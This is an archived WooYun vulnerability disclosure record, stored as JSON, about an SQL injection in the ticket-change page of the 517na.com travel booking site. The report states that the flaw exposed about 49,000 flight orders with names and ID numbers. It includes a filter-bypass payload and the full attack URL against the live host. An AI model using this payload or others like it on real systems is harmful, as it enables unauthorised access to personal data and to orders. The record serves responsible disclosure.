{"id": 48301, "wybug_id": "wooyun-2014-083522", "wybug_title": "四川我要去哪517旅行网某处SQL注入导致近5万机票订单信息泄露(姓名、身份证号、航班等)", "wybug_corp": "517na.com", "wybug_author": "Jim叔叔", "wybug_date": "2014-11-16 21:35", "wybug_open_date": "2014-12-31 21:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向公众公开  简要描述： 呀，面试结束了，面试官叫我在外面等一下，前台漂亮MM又给我倒了一杯茶，迟迟没有等到消息，于是... 详细说明：  问题页面：改签管理(gq.517na.com),我用普通用户进去一条信息也查不到。。于是寻找注入点，注入点存在于：queryType参数，虽然后端对” and ”，” or ”（前后均有空格时才拦截）等字符串进行了检测，所以想办法在or前后只要一个不留空格就可以绕过了：绕过payload：queryType=3) or(1=1\nhttp://gq.517na.com/BuyerChangeManage/ChangeManage?queryType=3) or(1=1&pnrCode=&orderId=&beginTime=2014-11-09&hidBeginTime=2014-11-09&endTime=2014-11-16&hidEndTime=2014-11-16&buyerId=\n一访问惊呆了，49333 条用户订单数据！！！\n\n并且可以对订单进行查看、支付、取消交易等操作！！\n\n\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  嘻嘻，说好的礼物呢....顺便求offer~~~   版权声明：转载请注明来源 Jim叔叔@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-11-16 22:28 厂商回复： 已确认。前台MM在挑选礼物中 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-17 10:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  要一份前台MM的写真    \n     2014-12-10 17:12 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  offer呢？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}